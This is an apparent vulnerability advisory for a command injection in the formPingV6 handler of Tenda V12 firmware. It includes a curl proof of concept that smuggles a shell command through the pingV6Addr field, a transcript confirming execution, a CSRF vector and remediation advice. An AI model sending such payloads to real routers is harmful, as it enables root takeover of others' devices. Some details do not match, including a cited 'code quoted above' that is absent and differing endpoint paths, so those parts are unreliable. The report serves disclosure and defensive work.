# Tenda V12 V56.1.1.11 was discovered to contain a command injection vulnerability in formPingV6

## Overview

- Vendor: Tenda
- Product: V12
- Version: V56.1.1.11
- Component: Boa formPingV6
- Vulnerability Class: CWE-78 command injection
- Manufacturer: https://www.tendacn.com/

## Affected version

- Firmware ZIP.
- `boa`.
- Sample ID `tenda-000104`.

## Vulnerability details

`formPingV6` reads `pingV6Addr` and concatenates it into a `ping6` command passed to `/bin/sh` without validation. `;`, backticks, and `$()` are accepted. The handler requires an admin session; Boa tracks login by source IP and has no CSRF token, so an admin-CSRF vector is possible. The dynamic test used an auth-bypass test image; `formPingV6` itself is unchanged.

## PoC

```sh
curl -sS --data-urlencode \
  'pingV6Addr=::1; echo PINGV6_INJECTED > /tmp/ping6.tmp; #' \
  http://<router>/boaform/formPingV6
```

## Reproduction and terminal evidence

Environment: FirmAE V12 image (auth-bypass test image; handler unchanged).
The handler echoes `/tmp/ping6.tmp` into the response.

Terminal transcript:

```
$ curl -sS --data-urlencode \
    'pingV6Addr=::1; echo PINGV6_INJECTED > /tmp/ping6.tmp; #' \
    http://127.0.0.1/boaform/formPingV6
<html>...
<body><blockquote><h4>
<span>PINGV6_INJECTED
</span><br></h4>...
```

The response contains the injected marker, proving command execution. A
headless-Chrome CSRF page submitted the same form from a logged-in admin
context and created a root-owned `/tmp/ping_csrf` in the guest.

## Verification

The vulnerable handler in the stock `Boa formPingV6` was decompiled from the unpacked rootfs (code quoted above), and the stock binary was run under qemu/FirmAE; the transcript is shown above.

## Impact

Authenticated admin or CSRF root command execution.

## Remediation

- Validate `pingV6Addr` as a literal IPv6 address or allow-list.
- Use `execve`/argv for `ping6`.
- Add CSRF tokens to Boa handlers.

## Known CVE relation

- NVD/MITRE keyword `formPingV6` / `pingV6Addr`: no matching CVE
  (2026-11-06). Candidate 0-day.

## Status and disclosure

Dynamic confirmation (FirmAE; handler unchanged; CSRF verified). Candidate
0-day; CVE application in progress.

## Additional Information

```markdown
### Vendor
Tenda

### Product
V12

### Version or Commit
V56.1.1.11

### Vulnerability Class
CWE-78 command injection

### CVE_status
CVE application in progress

### Description
formPingV6 concatenates pingV6Addr into a ping6 command passed to /bin/sh without validation; ;, backticks and $() are accepted.

### Affected_component
Boa formPingV6

### Attack_vector
Authenticated POST to /goform/formPingV6 with a crafted pingV6Addr.

### Product_version
V12 V56.1.1.11

### Reference
- https://www.tendacn.com/
- https://github.com/vuln-1/vuln/blob/main/Tenda/V12_V56.1.1.11/report-2.md
```
